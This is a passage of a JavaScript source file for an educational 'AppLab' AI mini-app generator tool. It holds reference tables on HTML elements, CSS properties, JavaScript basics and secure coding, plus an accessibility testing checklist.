// ═══════════════════════════════════════════════════════════════
// stem_tool_applab.js — AppLab: AI Mini-App Generator (v1.0)
// Freeform AI-powered app creation — describe what you want,
// AI generates a complete interactive HTML/CSS/JS mini-app.
// Science demos, interactive visualizations, educational tools.
// Registered tool ID: "appLab"
// Category: technology
// ═══════════════════════════════════════════════════════════════

window.StemLab = window.StemLab || {
  _registry: {}, _order: [],
  registerTool: function(id, config) { config.id = id; config.ready = config.ready !== false; this._registry[id] = config; if (this._order.indexOf(id) === -1) this._order.push(id); console.log('[StemLab] Registered tool: ' + id); },
  isRegistered: function(id) { return !!this._registry[id]; },
  renderTool: function(id, ctx) { var tool = this._registry[id]; if (!tool || !tool.render) return null; try { return tool.render(ctx); } catch(e) { console.error('[StemLab] Error rendering ' + id, e); return null; } }
};

(function() {
  'use strict';
  // ── Reduced motion CSS (WCAG 2.3.3) — shared across all STEM Lab tools ──
  (function() {
    if (document.getElementById('allo-stem-motion-reduce-css')) return;
    var st = document.createElement('style');
    st.id = 'allo-stem-motion-reduce-css';
    st.textContent = '@media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; scroll-behavior: auto !important; } }';
    document.head.appendChild(st);
  })();


  // ── Audio (auto-injected) ──
  var _applabAC = null;
  function getApplabAC() { if (!_applabAC) { try { _applabAC = new (window.AudioContext || window.webkitAudioContext)(); } catch(e) {} } if (_applabAC && _applabAC.state === "suspended") { try { _applabAC.resume(); } catch(e) {} } return _applabAC; }
  function applabTone(f,d,tp,v) { var ac = getApplabAC(); if (!ac) return; try { var o = ac.createOscillator(); var g = ac.createGain(); o.type = tp||"sine"; o.frequency.value = f; g.gain.setValueAtTime(v||0.07, ac.currentTime); g.gain.exponentialRampToValueAtTime(0.001, ac.currentTime+(d||0.1)); o.connect(g); g.connect(ac.destination); o.start(); o.stop(ac.currentTime+(d||0.1)); } catch(e) {} }
  function sfxApplabClick() { applabTone(600, 0.03, "sine", 0.04); }


  // ── WCAG Live Region ──
  (function() {
    if (document.getElementById('allo-live-applab')) return;
    var lr = document.createElement('div');
    lr.id = 'allo-live-applab'; lr.setAttribute('aria-live', 'polite'); lr.setAttribute('aria-atomic', 'true'); lr.setAttribute('role', 'status');
    lr.style.cssText = 'position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0';
    document.body.appendChild(lr);
  })();

  var STORAGE_GALLERY = 'alloAppLabGallery';

  // ─── HTML reference (NGSS + AP CSP + ISTE Standards aligned) ───────
  // Every tag students will use, with semantic meaning + accessibility
  // implications + common-use examples + when NOT to use it.
  // Source: WHATWG HTML Standard + W3C ARIA + MDN Web Docs.
  var HTML_REFERENCE = {
    structural: [
      { tag: '<html>', purpose: 'Root element of an HTML document. Lang attribute is critical for accessibility (e.g., lang="en").', whenUse: 'Always — must be the outermost wrapper.', whenAvoid: 'Never omit.', a11y: 'lang attribute helps screen readers pronounce text correctly + sets text direction (LTR/RTL).', example: '<html lang="en">...</html>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/html' },
      { tag: '<head>', purpose: 'Container for metadata (title, links, scripts that load before body renders).', whenUse: 'Always — every HTML document has exactly one head.', whenAvoid: 'Never omit; never put visible content here.', a11y: 'Must include <title> + meta viewport for accessibility.', example: '<head>\n  <title>Page Title</title>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n</head>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/head' },
      { tag: '<body>', purpose: 'Container for all visible content.', whenUse: 'Always — exactly one per document.', whenAvoid: 'Never omit.', a11y: 'Should not have aria-hidden on it. Use semantic landmarks inside.', example: '<body>\n  <main>...</main>\n</body>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/body' },
      { tag: '<header>', purpose: 'Introductory content for the page or a section (typically site logo, nav, title).', whenUse: 'Once per page (top-level) OR inside articles/sections.', whenAvoid: 'Avoid more than one top-level header per page.', a11y: 'Becomes a banner landmark when used at top-level. Screen readers can jump to it.', example: '<header>\n  <h1>Site Title</h1>\n  <nav>...</nav>\n</header>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/header' },
      { tag: '<nav>', purpose: 'A section of navigational links.', whenUse: 'Primary site nav + table of contents.', whenAvoid: 'Don\'t use for every group of links — just navigation ones.', a11y: 'Becomes a navigation landmark. Multiple nav elements need aria-label to distinguish.', example: '<nav aria-label="Primary">\n  <ul>\n    <li><a href="#home">Home</a></li>\n  </ul>\n</nav>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/nav' },
      { tag: '<main>', purpose: 'The primary content area of the page (excluding sidebars, footers, nav).', whenUse: 'Exactly once per page.', whenAvoid: 'Don\'t use twice. Don\'t wrap navigation.', a11y: 'Becomes a main landmark. Screen reader users can jump straight to it (skip-to-content).', example: '<main>\n  <h1>Page Title</h1>\n  <article>...</article>\n</main>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/main' },
      { tag: '<article>', purpose: 'A self-contained composition that could be distributed independently (blog post, news item, forum thread).', whenUse: 'Standalone pieces of content.', whenAvoid: 'Don\'t use for layout. Don\'t use just because it contains text.', a11y: 'Should have a heading. Screen readers announce articles as a landmark.', example: '<article>\n  <h2>Article Title</h2>\n  <p>Content...</p>\n</article>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/article' },
      { tag: '<section>', purpose: 'A thematic grouping of content with a heading.', whenUse: 'Distinct sections of a page (intro, methods, results).', whenAvoid: 'Don\'t use as a generic container — that\'s what <div> is for.', a11y: 'Should have a heading or aria-labelledby. Without one, it\'s announced generically.', example: '<section aria-labelledby="methods">\n  <h2 id="methods">Methods</h2>\n  ...\n</section>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/section' },
      { tag: '<aside>', purpose: 'Content tangentially related to the main content (sidebars, pull quotes, ads).', whenUse: 'Supplemental info that supports but isn\'t part of the main flow.', whenAvoid: 'Don\'t use for main content. Don\'t nest unnecessarily.', a11y: 'Becomes a complementary landmark. Should have aria-label if multiple asides exist.', example: '<aside aria-label="Related links">\n  <h3>See also</h3>\n  <ul>...</ul>\n</aside>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/aside' },
      { tag: '<footer>', purpose: 'Footer of the page or a section. Typically contains copyright, contact info, related links.', whenUse: 'End of page or section.', whenAvoid: 'Don\'t use for content that should be in <aside> or <nav>.', a11y: 'Top-level footer becomes contentinfo landmark.', example: '<footer>\n  <p>&copy; 2026 Site Name</p>\n</footer>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/footer' },
      { tag: '<div>', purpose: 'Generic container with no semantic meaning. Use for layout/styling only.', whenUse: 'When you need a wrapper for CSS but no semantic element fits.', whenAvoid: 'Don\'t use when a semantic element (article, section, nav) would work. Don\'t use as a button.', a11y: 'No semantic meaning. Screen readers skip past empty divs. Don\'t use as a button — use <button>.', example: '<div class="card">\n  <h3>Card</h3>\n</div>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/div' },
      { tag: '<span>', purpose: 'Generic inline container. Use for styling parts of text.', whenUse: 'When you need to style or script part of a text run.', whenAvoid: 'Don\'t use when a semantic inline element (strong, em, code) fits.', a11y: 'No semantic meaning. Adding role attribute can change that.', example: '<p>Total: <span class="highlight">$50</span></p>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/span' },
    ],
    text: [
      { tag: '<h1> through <h6>', purpose: 'Headings, with h1 being highest level + h6 lowest.', whenUse: 'Document structure — one h1 per page, then h2 for major sections, h3 for subsections, etc.', whenAvoid: 'Don\'t skip levels (don\'t go from h1 to h3). Don\'t use h1 inside a deeply-nested article unless it\'s the article\'s primary heading.', a11y: 'Screen readers create a heading outline that users can navigate. Skipping levels confuses navigation.', example: '<h1>Main Title</h1>\n<h2>Section</h2>\n<h3>Subsection</h3>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/h1' },
      { tag: '<p>', purpose: 'A paragraph of text.', whenUse: 'For paragraph content.', whenAvoid: 'Don\'t use empty <p> for spacing — use CSS margins instead.', a11y: 'Screen readers pause between paragraphs.', example: '<p>This is a paragraph.</p>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/p' },
      { tag: '<strong>', purpose: 'Important text — semantically emphasized.', whenUse: 'For text that has strong importance (warnings, key terms).', whenAvoid: 'Don\'t use just for bold styling — use CSS font-weight instead.', a11y: 'Screen readers MAY announce this with emphasis. Conveys importance.', example: '<p><strong>Warning:</strong> hot surface.</p>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/strong' },
      { tag: '<em>', purpose: 'Emphasized text — typically italicized but conveys emphasis.', whenUse: 'For words that change meaning when emphasized.', whenAvoid: 'Don\'t use just for italic styling.', a11y: 'Screen readers MAY change pitch/tone slightly.', example: '<p>I <em>love</em> coding.</p>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/em' },
      { tag: '<a>', purpose: 'Hyperlink to another page, fragment, or resource.', whenUse: 'For navigation between pages or to external sites.', whenAvoid: 'Don\'t use as a button (use <button>). Don\'t use with javascript: URLs.', a11y: 'href is required for keyboard accessibility. Link text should be meaningful (avoid "click here").', example: '<a href="https://example.com">Visit Example</a>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/a' },
      { tag: '<code>', purpose: 'Inline code snippet.', whenUse: 'For variable names, function names, file paths in prose.', whenAvoid: 'Don\'t use for block-level code (use <pre><code>).', a11y: 'Screen readers may announce "code".', example: '<p>Use the <code>console.log()</code> function.</p>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/code' },
      { tag: '<pre>', purpose: 'Preformatted text — whitespace is preserved.', whenUse: 'For block-level code blocks or ASCII art.', whenAvoid: 'Don\'t use for indentation in normal text.', a11y: 'Long pre blocks should have a heading or be in a region with aria-label.', example: '<pre><code>function hello() {\n  console.log("hi");\n}</code></pre>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/pre' },
      { tag: '<blockquote>', purpose: 'A block-level quotation.', whenUse: 'For long quotes from another source.', whenAvoid: 'Don\'t use for indentation — use CSS.', a11y: 'Screen readers announce "quote" + "end of quote".', example: '<blockquote cite="https://source.com">\n  <p>Quoted text...</p>\n</blockquote>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/blockquote' },
      { tag: '<ul>, <ol>, <li>', purpose: 'Unordered list, ordered list, list item.', whenUse: 'For lists of items — unordered (bullets) or ordered (numbers).', whenAvoid: 'Don\'t use just for layout.', a11y: 'Screen readers announce "list of N items" + item position. Lists are landmarks for navigation.', example: '<ul>\n  <li>First</li>\n  <li>Second</li>\n</ul>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/ul' },
    ],
    forms: [
      { tag: '<form>', purpose: 'A form containing input fields submitted to a server (or processed in JS).', whenUse: 'For any user input that gets submitted or processed.', whenAvoid: 'Don\'t omit if you have inputs — required for screen reader form mode.', a11y: 'Should have an accessible name (aria-label or aria-labelledby). Form mode activates assistive tech features.', example: '<form aria-label="Login form">\n  <label for="email">Email</label>\n  <input type="email" id="email">\n  <button type="submit">Submit</button>\n</form>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/form' },
      { tag: '<input>', purpose: 'A form input field — text, email, password, checkbox, radio, number, range, date, file, etc.', whenUse: 'For collecting any single piece of user input.', whenAvoid: 'Don\'t use type="text" when type="email" or type="number" or type="tel" would help mobile keyboards.', a11y: 'MUST have an associated <label> via for/id or aria-label. Required attribute communicates requiredness.', example: '<label for="age">Age</label>\n<input type="number" id="age" min="0" max="120">', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/input' },
      { tag: '<label>', purpose: 'Label for a form input.', whenUse: 'Always pair with an input.', whenAvoid: 'Don\'t omit if you have an input.', a11y: 'Critical for screen readers + clickable to focus the input. Use for attribute matching input id.', example: '<label for="name">Name</label>\n<input type="text" id="name">', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/label' },
      { tag: '<button>', purpose: 'A button that performs an action.', whenUse: 'For any clickable action that doesn\'t navigate.', whenAvoid: 'Don\'t use <div> as a button. Don\'t use <a> for non-navigation actions.', a11y: 'Has type="button" by default (in form, type="submit"). Activated by Enter and Space. Disabled state communicated to AT.', example: '<button type="button" onclick="doThing()">Click me</button>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/button' },
      { tag: '<select>, <option>', purpose: 'A dropdown selection list.', whenUse: 'For mutually-exclusive choice among many options (5+).', whenAvoid: 'Don\'t use for 2-3 options — use radio buttons instead.', a11y: 'Has accessible name from <label> or aria-label. Native keyboard support (arrow keys).', example: '<label for="state">State</label>\n<select id="state">\n  <option>California</option>\n  <option>Texas</option>\n</select>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/select' },
      { tag: '<textarea>', purpose: 'Multi-line text input.', whenUse: 'For long text content (comments, descriptions, code).', whenAvoid: 'Don\'t use for single-line text — use <input type="text">.', a11y: 'Needs a label. Maxlength attribute is useful + announced.', example: '<label for="bio">Bio</label>\n<textarea id="bio" rows="4" cols="50"></textarea>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/textarea' },
      { tag: '<fieldset>, <legend>', purpose: 'Group related form inputs with a caption.', whenUse: 'For groups of related inputs (radio button groups, address fields).', whenAvoid: 'Don\'t use for single inputs.', a11y: 'Screen readers announce fieldset legend + then individual labels. Critical for radio groups.', example: '<fieldset>\n  <legend>Gender</legend>\n  <label><input type="radio" name="gen"> Male</label>\n  <label><input type="radio" name="gen"> Female</label>\n</fieldset>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/fieldset' },
    ],
    media: [
      { tag: '<img>', purpose: 'An image.', whenUse: 'For meaningful images (not just decoration).', whenAvoid: 'Don\'t use for decorative images — use CSS background-image instead.', a11y: 'MUST have alt attribute. Decorative images use alt="" (empty). Meaningful images describe what\'s shown.', example: '<img src="logo.png" alt="School logo: an eagle in flight">', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/img' },
      { tag: '<video>', purpose: 'Embedded video player.', whenUse: 'For video content.', whenAvoid: 'Don\'t auto-play with sound by default.', a11y: 'MUST have captions track (<track>) for accessibility. Controls attribute provides default UI.', example: '<video controls>\n  <source src="lesson.mp4" type="video/mp4">\n  <track kind="captions" src="lesson.vtt">\n</video>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/video' },
      { tag: '<audio>', purpose: 'Embedded audio player.', whenUse: 'For audio content (podcasts, music samples).', whenAvoid: 'Don\'t auto-play.', a11y: 'Provide a transcript link. Caption track is also useful.', example: '<audio controls>\n  <source src="podcast.mp3" type="audio/mp3">\n</audio>\n<a href="transcript.html">Transcript</a>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/audio' },
      { tag: '<canvas>', purpose: 'A drawing surface for JavaScript graphics.', whenUse: 'For dynamic graphics + games + visualizations.', whenAvoid: 'Don\'t use for static images — use <img>. Don\'t use for text — canvas text is inaccessible.', a11y: 'Add fallback content inside <canvas> tags (text + alt content for screen readers). Use aria-label.', example: '<canvas id="game" width="800" height="400" aria-label="Game canvas">\n  Your browser does not support canvas.\n</canvas>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/canvas' },
      { tag: '<svg>', purpose: 'Scalable vector graphics — embedded directly in HTML.', whenUse: 'For icons + logos + charts.', whenAvoid: 'Don\'t use raster image markup for vector content.', a11y: 'Add title + desc inside SVG. Use role="img" + aria-label on the SVG element.', example: '<svg role="img" aria-label="Heart icon" viewBox="0 0 24 24">\n  <title>Heart</title>\n  <path d="..."/>\n</svg>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/svg' },
    ],
    tables: [
      { tag: '<table>', purpose: 'Tabular data with rows + columns.', whenUse: 'For actual data tables.', whenAvoid: 'Don\'t use for page layout (use CSS Grid or Flexbox).', a11y: 'MUST have a caption + headers (<th>) with scope attribute. Screen readers announce "table" + dimensions.', example: '<table>\n  <caption>Sales 2026</caption>\n  <thead><tr><th scope="col">Month</th><th scope="col">Total</th></tr></thead>\n  <tbody><tr><td>Jan</td><td>$5000</td></tr></tbody>\n</table>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/table' },
      { tag: '<th>', purpose: 'Table header cell.', whenUse: 'For column or row headers.', whenAvoid: 'Don\'t use as a data cell.', a11y: 'Must have scope="col" or scope="row" for screen readers to associate data with headers.', example: '<th scope="col">Name</th>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/th' },
    ],
    interactive: [
      { tag: '<details>, <summary>', purpose: 'A native expand/collapse widget.', whenUse: 'For FAQ items, additional details, hidden content.', whenAvoid: 'Don\'t reinvent with JS when this works.', a11y: 'Native keyboard support. Screen readers announce expanded/collapsed state.', example: '<details>\n  <summary>What is HTML?</summary>\n  <p>HTML is the standard markup language...</p>\n</details>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/details' },
      { tag: '<dialog>', purpose: 'A native modal/dialog box.', whenUse: 'For modal dialogs + confirmation prompts.', whenAvoid: 'Don\'t use for non-modal content (use <aside> or <section>).', a11y: 'Native focus trap. showModal() blocks interaction with rest of page. Use close() to dismiss.', example: '<dialog id="confirm">\n  <p>Are you sure?</p>\n  <button onclick="confirm.close()">Cancel</button>\n</dialog>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog' },
      { tag: '<progress>', purpose: 'A progress bar indicator.', whenUse: 'For progress of a task (file upload, loading).', whenAvoid: 'Don\'t use for ratings or other values — use <meter>.', a11y: 'Screen readers announce progress value + max.', example: '<label for="upload">Upload progress</label>\n<progress id="upload" value="60" max="100">60%</progress>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/progress' },
      { tag: '<meter>', purpose: 'A scalar measurement within a known range.', whenUse: 'For ratings, disk usage, etc.', whenAvoid: 'Don\'t use for progress (use <progress>).', a11y: 'Screen readers announce value + range.', example: '<label for="disk">Disk usage</label>\n<meter id="disk" min="0" max="100" value="75">75%</meter>', mdn: 'developer.mozilla.org/en-US/docs/Web/HTML/Element/meter' },
    ],
  };

  // ─── CSS reference (with WCAG 2.1 AA considerations) ───────────────
  var CSS_REFERENCE = {
    layout: [
      { property: 'display', values: 'block, inline, inline-block, flex, grid, none', purpose: 'Controls how an element renders in the document flow.', wcag: 'display:none removes from accessibility tree. visibility:hidden also removes. Don\'t hide focused elements.', example: 'nav { display: flex; gap: 16px; }', mdn: 'developer.mozilla.org/en-US/docs/Web/CSS/display' },
      { property: 'flex (flexbox)', values: 'display:flex on parent; flex:1 on children', purpose: 'One-dimensional layout (row or column).', wcag: 'Visual order can differ from DOM order via flex-direction:row-reverse, etc. Be careful — tab order follows DOM, not visual.', example: '.row { display: flex; gap: 12px; align-items: center; }', mdn: 'developer.mozilla.org/en-US/docs/Web/CSS/CSS_Flexible_Box_Layout' },
      { property: 'grid', values: 'display:grid; grid-template-columns:...', purpose: 'Two-dimensional layout (rows AND columns).', wcag: 'Same DOM/visual order concern as flex. Use only when truly needed.', example: '.grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }', mdn: 'developer.mozilla.org/en-US/docs/Web/CSS/CSS_Grid_Layout' },
      { property: 'position', values: 'static, relative, absolute, fixed, sticky', purpose: 'How an element is positioned relative to its containing block.', wcag: 'Sticky/fixed elements can cover content or focus indicators. Test with keyboard navigation.', example: '.modal { position: fixed; top: 0; }', mdn: 'developer.mozilla.org/en-US/docs/Web/CSS/position' },
    ],
    text: [
      { property: 'color', values: 'hex, rgb, rgba, hsl, named colors', purpose: 'Text color.', wcag: '4.5:1 contrast minimum for normal text + 3:1 for large text (18pt or 14pt bold). Tool to check: webaim.org/resources/contrastchecker.', example: 'p { color: #1a1a1a; background: #ffffff; /* 17:1 ratio */ }', mdn: 'developer.mozilla.org/en-US/docs/Web/CSS/color' },
      { property: 'font-size', values: '16px, 1rem, 1em, %, vw', purpose: 'Text size.', wcag: 'Use rem or em (NOT px alone). Allow user font-size to scale up via OS settings.', example: 'body { font-size: 1rem; } /* root is typically 16px */', mdn: 'developer.mozilla.org/en-US/docs/Web/CSS/font-size' },
      { property: 'line-height', values: '1.5, 24px, 1.5em', purpose: 'Vertical spacing between lines of text.', wcag: 'WCAG 1.4.12: line height should be at least 1.5x font size for readable body text.', example: 'p { line-height: 1.6; }', mdn: 'developer.mozilla.org/en-US/docs/Web/CSS/line-height' },
    ],
    accessibility: [
      { property: 'focus-visible', values: ':focus-visible { outline: 2px solid blue; }', purpose: 'Apply focus styles only when keyboard focus is detected.', wcag: '2.4.7 Focus visible: ALL focusable elements must have a visible focus indicator. Don\'t remove outline:none without replacing it.', example: 'button:focus-visible { outline: 3px solid #2563eb; outline-offset: 2px; }', mdn: 'developer.mozilla.org/en-US/docs/Web/CSS/:focus-visible' },
      { property: 'prefers-reduced-motion', values: '@media (prefers-reduced-motion: reduce) { ... }', purpose: 'Detect user preference to reduce animation/motion.', wcag: '2.3.3 Animation from interactions: provide a mechanism to disable animation that\'s not essential.', example: '@media (prefers-reduced-motion: reduce) { * { animation-duration: 0.01ms !important; } }', mdn: 'developer.mozilla.org/en-US/docs/Web/CSS/@media/prefers-reduced-motion' },
      { property: 'sr-only class pattern', values: 'position:absolute; width:1px; height:1px; ...', purpose: 'Visually hide content but keep it in the accessibility tree.', wcag: 'Useful for screen-reader-only headings, descriptions, or live region announcers.', example: '.sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0; }', mdn: 'webaim.org/techniques/css/invisiblecontent' },
    ],
  };

  // ─── JavaScript reference (with security + accessibility notes) ────
  var JS_REFERENCE = {
    variables: [
      { name: 'let', purpose: 'Declares a block-scoped variable. Can be reassigned.', example: 'let count = 0;\ncount = 1; // OK', whenUse: 'For variables that change.', whenAvoid: 'Use const for values that don\'t change.', mdn: 'developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let' },
      { name: 'const', purpose: 'Declares a block-scoped variable. CANNOT be reassigned.', example: 'const PI = 3.14159;\n// PI = 3.14; // ERROR', whenUse: 'For values that don\'t change. Default to const.', whenAvoid: 'Don\'t use when the value will change.', mdn: 'developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const' },
      { name: 'var', purpose: 'Declares a function-scoped variable (legacy).', example: 'var x = 1;', whenUse: 'Avoid in modern code.', whenAvoid: 'Use let or const instead. var has weird hoisting behavior.', mdn: 'developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/var' },
    ],
    types: [
      { name: 'String', example: '"hello", \'hello\', `template ${var}`', methods: 'length, toUpperCase(), toLowerCase(), split(), replace(), trim(), slice(), includes()', notes: 'Template literals with backticks support interpolation.' },
      { name: 'Number', example: '42, 3.14, -1, 0', methods: 'toString(), toFixed(2), parseInt(), parseFloat()', notes: 'No distinction between int + float. NaN is "not a number". Infinity exists.' },
      { name: 'Boolean', example: 'true, false', methods: '&&, ||, !, ===', notes: 'Falsy values: false, 0, "", null, undefined, NaN. Everything else is truthy.' },
      { name: 'Array', example: '[1, 2, 3], ["a", "b"]', methods: 'length, push(), pop(), shift(), unshift(), slice(), splice(), forEach(), map(), filter(), reduce()', notes: 'Zero-indexed. Mixed types allowed. Modern JS prefers immutable methods (map, filter, reduce).' },
      { name: 'Object', example: '{ name: "Alice", age: 30 }', methods: 'keys(), values(), entries(), assign(), freeze()', notes: 'Key-value pairs. Access with . or []. Use spread (...) to copy.' },
      { name: 'null', example: 'let x = null;', methods: 'N/A', notes: 'Intentional absence of value. typeof null === "object" (historical bug).' },
      { name: 'undefined', example: 'let x; // x is undefined', methods: 'N/A', notes: 'Variable declared but not assigned. Returned when accessing missing object properties.' },
    ],
    controlFlow: [
      { name: 'if/else if/else', example: 'if (x > 10) {\n  // ...\n} else if (x > 5) {\n  // ...\n} else {\n  // ...\n}', notes: 'Conditional execution. Falsy values evaluate as false.' },
      { name: 'switch', example: 'switch (color) {\n  case "red": go(); break;\n  case "green": stop(); break;\n  default: wait();\n}', notes: 'Compare against multiple values. Always include break to avoid fall-through.' },
      { name: 'for loop', example: 'for (let i = 0; i < 10; i++) {\n  console.log(i);\n}', notes: 'Initialization, condition, increment. Most common loop type.' },
      { name: 'for...of loop', example: 'for (const item of [1, 2, 3]) {\n  console.log(item);\n}', notes: 'Iterates over iterable values (arrays, strings, sets, maps).' },
      { name: 'for...in loop', example: 'for (const key in { a: 1, b: 2 }) {\n  console.log(key);\n}', notes: 'Iterates over object keys. Avoid for arrays (use forEach or for...of).' },
      { name: 'while loop', example: 'let i = 0;\nwhile (i < 10) {\n  i++;\n}', notes: 'Loops while condition is true. Use when iteration count is unknown.' },
      { name: 'break + continue', example: 'for (let i = 0; i < 10; i++) {\n  if (i === 5) break;\n  if (i % 2 === 0) continue;\n}', notes: 'break exits the loop. continue skips to next iteration.' },
    ],
    functions: [
      { name: 'function declaration', example: 'function greet(name) {\n  return `Hello, ${name}!`;\n}', notes: 'Hoisted to top of scope. Has its own this binding.' },
      { name: 'arrow function', example: 'const greet = (name) => `Hello, ${name}!`;\n// Or with body:\nconst add = (a, b) => {\n  return a + b;\n};', notes: 'Lexical this (inherits from enclosing scope). Concise syntax. Cannot be used as constructors.' },
      { name: 'callback function', example: '[1, 2, 3].map((n) => n * 2);', notes: 'A function passed as argument to another function. Foundational pattern in JS.' },
      { name: 'async/await', example: 'async function fetchData() {\n  const response = await fetch("/api/data");\n  return response.json();\n}', notes: 'For asynchronous code. await pauses execution until promise resolves. Cleaner than .then().' },
    ],
    domManipulation: [
      { name: 'document.getElementById', example: 'const el = document.getElementById("myBtn");', notes: 'Find element by ID. Returns single element or null.' },
      { name: 'document.querySelector', example: 'const el = document.querySelector(".class");\nconst all = document.querySelectorAll("p");', notes: 'CSS selector-based search. Most flexible. querySelectorAll returns NodeList.' },
      { name: 'element.addEventListener', example: 'btn.addEventListener("click", function(event) {\n  console.log("clicked!");\n});', notes: 'Attach event handlers. Multiple handlers per element allowed.' },
      { name: 'element.innerHTML / textContent', example: 'el.textContent = "Safe text";\n// AVOID: el.innerHTML = userInput; // XSS risk', notes: 'Use textContent for user input (escapes HTML). Use innerHTML only with trusted content.' },
      { name: 'element.style', example: 'el.style.color = "red";\nel.style.backgroundColor = "blue";', notes: 'Inline style modification. Prefer CSS classes for maintainability.' },
      { name: 'element.classList', example: 'el.classList.add("active");\nel.classList.remove("hidden");\nel.classList.toggle("open");', notes: 'Modify CSS classes programmatically. Cleaner than manipulating className string.' },
    ],
    security: [
      { name: 'XSS prevention', example: '// Use textContent, not innerHTML\nel.textContent = userInput;\n// Or escape HTML:\nfunction escape(str) {\n  return str.replace(/[&<>"\']/g, function(c) {\n    return { "&": "&amp;", "<": "&lt;", ">": "&gt;", \'"\': "&quot;", "\'": "&#39;" }[c];\n  });\n}', notes: 'Cross-site scripting (XSS) happens when user input is inserted into HTML without escaping. NEVER trust user input.' },
      { name: 'CSP (Content Security Policy)', example: '// Server header (or meta tag):\n// Content-Security-Policy: default-src \'self\'; script-src \'self\'\n', notes: 'Restrict where scripts can come from. Important defense-in-depth for web apps.' },
      { name: 'Don\'t use eval()', example: '// BAD:\n// eval(userInput); // Massive security risk\n// GOOD:\n// const fn = new Function("a", "b", "return a + b");\n', notes: 'eval() executes any code. Almost never the right answer. Most use cases can be done safely with JSON.parse, Function constructor with explicit args, or just restructuring code.' },
    ],
  };

  // ─── A11y testing checklist (very detailed) ─────────────────────
  var A11Y_TESTING_CHECKLIST = [
    {
      category: 'Page structure',
      items: [
        { check: 'Page has descriptive <title> tag', why: 'Screen readers announce title on page load.', test: 'Read the title aloud — does it tell you what page this is?' },
        { check: 'Page has a single <h1>', why: 'Heading hierarchy depends on h1 as root.', test: 'View page outline. Count h1 elements.' },
        { check: 'Heading levels are sequential (no skipping)', why: 'Screen reader users navigate by headings.', test: 'View page outline. Are levels h1 → h2 → h3 in order?' },
        { check: 'Page has <html lang="en"> (or appropriate language)', why: 'Screen readers use language to choose voice.', test: 'View source. Check html element.' },
        { check: 'Page uses semantic landmarks (header, main, nav, footer)', why: 'Screen reader users can jump between sections.', test: 'Inspect outline. Are landmarks present?' },
        { check: 'Only ONE main landmark per page', why: 'Multiple confuses screen readers.', test: 'Search source for <main.' },
        { check: 'Skip-to-content link at top of page', why: 'Bypass repeated nav for keyboard users.', test: 'Tab to focus. Is first focusable a skip link?' },
      ],
    },
    {
      category: 'Images + media',
      items: [
        { check: 'All meaningful images have alt text', why: 'Screen readers need to describe images.', test: 'View source. Each <img> should have alt attribute.' },
        { check: 'Decorative images have alt=""', why: 'Screen readers should skip decorative content.', test: 'Inspect each decorative image. Empty alt = skipped.' },
        { check: 'Alt text is descriptive (not "image" or "photo")', why: 'Should describe what\'s shown, not file type.', test: 'Read alt aloud. Does it convey the image\'s meaning?' },
        { check: 'Complex images (charts) have detailed alternative', why: 'Charts need full text alternatives.', test: 'Check for <figcaption> or longdesc.' },
        { check: 'Videos have captions', why: 'Deaf/hard-of-hearing users need text.', test: 'Play video. Captions display?' },
        { check: 'Audio content has transcripts', why: 'Deaf/HOH need text.', test: 'Is transcript linked?' },
        { check: 'Auto-playing media has pause control', why: 'Auto-play can disorient or be distracting.', test: 'Click pause. Does it work?' },
      ],
    },
    {
      category: 'Color + contrast',
      items: [
        { check: 'Body text contrast >= 4.5:1', why: 'WCAG AA requirement.', test: 'Use WebAIM Contrast Checker.' },
        { check: 'Large text contrast >= 3:1', why: 'WCAG AA for 18pt or 14pt bold.', test: 'Same tool.' },
